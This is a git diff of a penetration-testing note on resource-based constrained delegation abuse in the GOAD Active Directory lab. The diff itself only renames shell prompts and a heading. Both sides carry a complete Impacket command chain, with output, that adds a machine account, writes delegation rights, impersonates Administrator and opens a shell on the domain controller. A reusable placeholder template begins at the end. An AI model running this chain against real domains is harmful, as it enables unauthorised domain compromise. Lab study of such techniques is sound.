@@ -13,7 +13,7 @@ If a user has GenericAll/GenericWrite over a host, RBCD is possible
 First, we need to add a computer account:
 
 ```bash
-gareth@gareth:~/pentest/GOAD/v3/adcs$ addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip 192.168.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
+garffff@garffff:~/GOAD$ addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip 192.168.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Successfully added machine account rbcd$ with password rbcdpass.
@@ -22,7 +22,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 Next, is to add the delegation access:
 
 ```bash
-gareth@gareth:~/pentest/GOAD/v3/adcs$ rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 192.168.56.10 -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
+garffff@garffff:~/GOAD$ rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 192.168.56.10 -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
@@ -35,7 +35,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 We can now impersonate the target user by requesting a TGS:
 
 ```bash
-gareth@gareth:~/pentest/GOAD/v3/adcs/v1$ getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 192.168.56.10 'sevenkingdoms.local/rbcd$:rbcdpass'
+garffff@garffff:~/GOAD/v1$ getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 192.168.56.10 'sevenkingdoms.local/rbcd$:rbcdpass'
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [-] CCache file is not found. Skipping...
@@ -48,13 +48,13 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 Load the ticket:
 
 ```bash
-gareth@gareth:~/pentest/GOAD/v3/adcs/v1$ export KRB5CCNAME=Administrator.ccache
+garffff@garffff:~/GOAD/v1$ export KRB5CCNAME=Administrator.ccache
 ```
 
 Access the target host (DNS is required):
 
 ```bash
-gareth@gareth:~/pentest/GOAD/v3/adcs/v1$ wmiexec.py -k -no-pass kingslanding.sevenkingdoms.local
+garffff@garffff:~/GOAD/v1$ wmiexec.py -k -no-pass kingslanding.sevenkingdoms.local
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] SMBv3.0 dialect used
@@ -64,7 +64,7 @@ C:\>whoami
 sevenkingdoms\administrator
 ```
 
-Summary
+### Summary
 
 ```bash
 addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip <dc_ip> '<domain>/<user>:<password>
